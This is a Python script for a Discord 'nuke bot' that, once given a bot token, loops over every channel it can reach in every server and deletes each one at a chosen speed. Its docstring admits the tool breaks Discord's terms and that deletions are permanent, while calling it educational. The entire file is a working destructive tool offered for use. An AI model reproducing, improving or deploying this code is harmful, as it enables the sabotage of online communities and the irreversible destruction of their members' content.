# -*- coding: utf-8 -*-

"""
- Usage of this bot is not at all recommended as its against the Terms of Service of discord.
- Your account may get banned if you use this bot.
- You can still make an alt account if you are that desperate.
- The bot requires `Manage Channels` permission in every server.
- Deletes (or at least tries to) delete all the channels accessible to the bot.
- Use this at your own risk.
- Channels once deleted cannot come back.
- Made strictly for educational purposes only.
- I won't be responsible for any stupid things which any of you might not / might do.
"""

# imports
import json
import sys
from colorama import Fore, Style
import discord
import asyncio as aio
import random as rd
from discord.ext import commands as NukeBot

# set up the bot
it = discord.Intents.default()  # privileged intents are not really required
bot = NukeBot.Bot(command_prefix="!", intents=it, chunk_guilds_at_startup=False)  # the main Bot instance

# other stuff
intro = f"""- USE THIS AT YOUR OWN RISK. Read this for full info: https://github.com/Videro1407/nuke-bot/blob/main/README.md
- Made strictly for educational purposes by @Videro1407: https://linktr.ee/videro
- I won't be responsible for any stupid things which any of you might not / might do."""
NukeBotHitFont = """
███╗░░██╗██╗░░░██╗██╗░░██╗███████╗  ██████╗░░█████╗░████████╗
████╗░██║██║░░░██║██║░██╔╝██╔════╝  ██╔══██╗██╔══██╗╚══██╔══╝
██╔██╗██║██║░░░██║█████═╝░█████╗░░  ██████╦╝██║░░██║░░░██║░░░
██║╚████║██║░░░██║██╔═██╗░██╔══╝░░  ██╔══██╗██║░░██║░░░██║░░░
██║░╚███║╚██████╔╝██║░╚██╗███████╗  ██████╦╝╚█████╔╝░░░██║░░░
╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝  ╚═════╝░░╚════╝░░░░╚═╝░░░"""

# print the info
print(Fore.RED + Style.BRIGHT + NukeBotHitFont)
print(Fore.GREEN + Style.BRIGHT + intro)

# config load
config = json.loads(open('config.json', 'r').read())

# speed config
Time = 5
speed = input(Fore.BLUE + Style.BRIGHT + f"At what speed do you want to nuke the channels?\n"
              f"Options available: slow, medium, fast, insane\n")
if speed.lower() == 'slow':
    Time = 10
elif speed.lower() == 'medium':
    Time = 5
elif speed.lower() == 'fast':
    Time = 3
elif speed.lower() == 'insane':
    Time = 1
elif speed.lower() == 'godly':  # lil' easter egg
    Time = 1 / 2
elif int(speed) == 1:
    Time = 10
elif int(speed) == 2:
    Time = 5
elif int(speed) == 3:
    Time = 3
elif int(speed) == 4:
    Time = 1
elif int(speed) == 5:  # lil' easter egg
    Time = 1 / 2
else:
    print(f'Invalid speed entered, default speed selected.')
    Time = 5
print(f"Speed: 1 channel per {Time} second{'s' if Time > 1 else ''}")

# logging in message
print(f"Bot is logging in...")


async def nuke():  # main task
    gone = 0  # number of channels deleted
    not_gone = 0  # number of channels which could not be deleted
    while True:  # while loop
        try:
            await bot.wait_until_ready()  # wait till the bot is ready and logged in
            if len(list(bot.get_all_channels())) == 0:  # if there are no channels
                print(Fore.RED+Style.BRIGHT+f"[NO CHANNELS]: The bot `{str(bot.user)}` has access to no channels.")
                sys.exit()  # exit the script
            r1 = rd.randint(1, 10)  # random number from 1 to 10
            if r1 == 5:  # this will be displayed randomly
                print(f'Total channels discovered: {gone + not_gone} channels\n'
                      f'Total channels deleted: {gone} channels')
            for channel in bot.get_all_channels():  # get all the abc.GuildChannels
                await aio.sleep(Time)  # speed of deleting the channels
                try:
                    await channel.delete(reason=f"Nuke Bot")  # delete the channel
                    print(Fore.GREEN + Style.BRIGHT + f"[SUCCESS]: Deleted {channel.name} ({channel.id}).\n"
                                                      f"           Guild: {channel.guild.name} ({channel.guild.id})\n"
                                                      f"           Total Channels Deleted: {gone}") # print it
                    gone += 1  # add 1 to `gone`
                except Exception as e:  # error handling
                    if isinstance(e, discord.Forbidden):  # the bto does not have perms to delete the channel
                        not_gone += 1  # add 1 to `not_gone`
                        print(Fore.RED+Style.BRIGHT+f'[MISSING ACCESS]: Could not delete {channel.name} ({channel.id})\n'
                                                    f'                  Guild: {channel.guild.name} ({channel.guild.id})\n'
                                                    f'                  Channels not deleted: {not_gone}')  # print it
                        pass  # pass/ignore the exception
                    else:  # any unknown error
                        not_gone += 1  # add 1 to `not_gone`
                        print(Fore.RED+Style.BRIGHT+f'[OTHER ERROR]: Could not delete {channel.name} ({channel.id})\n'
                                                    f'               Guild: {channel.guild.name} ({channel.guild.id})\n'
                                                    f'               Channels not deleted: {not_gone}')  # print it
                        pass  # pass/ignore the exception
        except RuntimeError:  # Tried to do this but it didn't quite work
            print(Fore.GREEN + Style.BRIGHT + f"Try inviting the bot into other servers.")


@bot.event  # event decorator
async def on_ready():  # when the bot has logged in and is ready to go
    print(Fore.GREEN + Style.BRIGHT + f"Logged in as {str(bot.user)} ({bot.user.id})")  # print that we are ready
    await aio.sleep(0.5)  # little delay before the next print
    all_channels = len(list(bot.get_all_channels()))
    print(Fore.GREEN + Style.BRIGHT + f"Starting nuking channels..\n"
                                      f"Total Channels Accessible: {all_channels}")  # print the channels accessible


bot.loop.create_task(nuke())  # create the task here
bot.run(config['BOT_TOKEN'])  # run the bot (connect + login)
